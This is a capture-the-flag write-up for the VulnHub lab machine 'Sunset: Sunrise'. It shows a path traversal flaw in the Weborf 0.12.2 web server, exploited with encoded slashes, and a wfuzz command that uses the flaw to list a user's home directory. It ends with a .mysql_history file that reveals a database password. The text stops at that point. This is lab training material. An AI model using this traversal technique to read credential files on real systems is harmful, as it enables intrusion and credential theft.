# Sunset: Sunrise

https://www.vulnhub.com/entry/sunset-sunrise,406/

## Reconnaisance

A quick nmap over all ports only revealed 22, 80, 3306 and 8080 open. No FTP this time.

Port 80 is hosting some sort of default nginx file, while 8080 seems to be hosting the var/www folder using something called Weborf/0.12.2. It showed html/ and when I clicked through, it contained `index.nginx-debian.html` that showed the same content as port 80.

Looking up Weborf with that version, it is vulnerable to path traversal when using encoding slashes, and testing this proved I could navigate throughout the machine.

## Exploring and wfuzz

I browsed around the machine, but couldn't find anything. I could reach the weborf home directory, but couldn't see anything in there. Following a hint, I decided to use wfuzz on it.

The path to show the directory was `http://192.168.53.7:8080/..%2f..%2fhome%2fweborf%2f`, and a useful wordlist for local user directory fuzzing is `/usr/share/wordlists/dirb/common.txt` on kali.

The following wfuzz command found several files: `wfuzz -w /usr/share/wordlists/dirb/common.txt --sc 200 http://192.168.53.7:8080/..%2f..%2fhome%2fweborf%2fFUZZ`:

```
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://192.168.53.7:8080/..%2f..%2fhome%2fweborf%2fFUZZ
Total requests: 4614

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                          
===================================================================

000000001:   200        2 L      18 W     439 Ch      ""                                                                                                                               
000000003:   200        113 L    483 W    3526 Ch     ".bashrc"                                                                                                                        
000000016:   200        2 L      8 W      83 Ch       ".mysql_history"                                                                                                                 
000000019:   200        27 L     130 W    807 Ch      ".profile"                                                                                                                       

Total time: 13.47158
Processed Requests: 4614
Filtered Requests: 4610
Requests/sec.: 342.4987
```

Opening .mysql_history revealed:

```
show databases;
ALTER USER 'weborf'@'localhost' IDENTIFIED BY 'iheartrainbows44'; 
```
